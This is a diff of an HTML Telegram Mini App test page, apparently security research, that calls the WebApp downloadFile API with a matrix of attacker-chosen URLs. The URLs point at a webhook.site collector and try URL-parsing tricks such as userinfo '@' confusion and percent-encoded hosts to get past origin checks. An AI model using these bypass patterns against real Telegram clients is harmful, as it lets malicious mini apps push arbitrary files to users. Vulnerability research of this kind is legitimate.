@@ -1,23 +1,64 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ZCode Sec Test</title>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>web-app-ext matrix</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-</head><body>
-<h3>web-app-ext probe</h3>
+<style>
+body { font-family: monospace; background: #fff; color: #111; padding: 10px; font-size: 11px; }
+.log { border-bottom: 1px solid #ddd; padding: 3px 0; word-break: break-all; }
+.ok { color: green; } .bad { color: #b00; } .dim { color: #888; }
+button { margin: 4px 2px; padding: 8px; font-size: 12px; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<button id="run">Run matrix</button>
 <script>
+const WH = 'https://webhook.site/74aa897d-5aac-4477-890c-179212c5e77b';
+const DOM = 'matthewadem.github.io';
 const tg = window.Telegram.WebApp;
-tg.ready();
-const log = (m) => { document.body.insertAdjacentHTML('beforeend', '<div>' + m + '</div>'); };
-log('initData=' + (tg.initData || '').slice(0, 80));
-// THE TEST: downloadFile with an ATTACKER-CHOSEN URL (this is what a malicious bot's mini app could do)
-if (tg.downloadFile) {
-  log('downloadFile available');
-  try {
-    const res = tg.downloadFile('https://webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/probe.png', {});
-    log('downloadFile returned: ' + JSON.stringify(res).slice(0, 120));
-  } catch (e) { log('downloadFile threw: ' + e); }
-} else {
-  log('NO downloadFile method in this WebView bridge version');
+const out = document.getElementById('out');
+function log(msg, cls) {
+  const d = document.createElement('div');
+  d.className = 'log ' + (cls || '');
+  d.textContent = msg;
+  out.appendChild(d);
 }
-if (tg.requestFile) { log('requestFile available'); }
+log('initData=' + (tg.initData || '').slice(0, 60) + '...');
+log('platform=' + tg.platform + ' version=' + tg.version);
+tg.ready();
+
+const CASES = [
+  { id: 'plain-foreign',  url: WH + '/m1-plain-foreign.png' },
+  { id: 'userinfo',       url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m2-userinfo.png' },
+  { id: 'encoded-at',     url: 'https://' + DOM + '%40webhook.site/m4.png' },
+  { id: 'at-enc-user',    url: 'https://' + DOM + '@%77ebhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m5.png' },
+  { id: 'own-domain',     url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
+  { id: 'tg-origin',      url: 'https://web.telegram.org/k/m7-tgorigin.png' }
+];
+
+let idx = 0;
+function next() {
+  if (idx >= CASES.length) { log('MATRIX DONE', 'ok'); return; }
+  const c = CASES[idx++];
+  log('[' + c.id + '] calling downloadFile...', 'dim');
+  try {
+    const p = tg.downloadFile(c.url, 'probe_' + c.id + '.png');
+    log('[' + c.id + '] returned ' + (p && typeof p.then === 'function' ? 'Promise' : p));
+    if (p && typeof p.then === 'function') {
+      p.then(v => log('[' + c.id + '] resolved: ' + JSON.stringify(v), 'ok'),
+              e => log('[' + c.id + '] rejected: ' + (e && e.message || e), 'bad'));
+    }
+  } catch (e) {
+    log('[' + c.id + '] threw: ' + (e && e.message || e), 'bad');
+  }
+  setTimeout(next, 3500);
+}
+tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));
+document.getElementById('run').onclick = () => { idx = 0; next(); };
+log('probe loaded - press Run matrix');
 </script>
-</body></html>
+</body>
+</html>
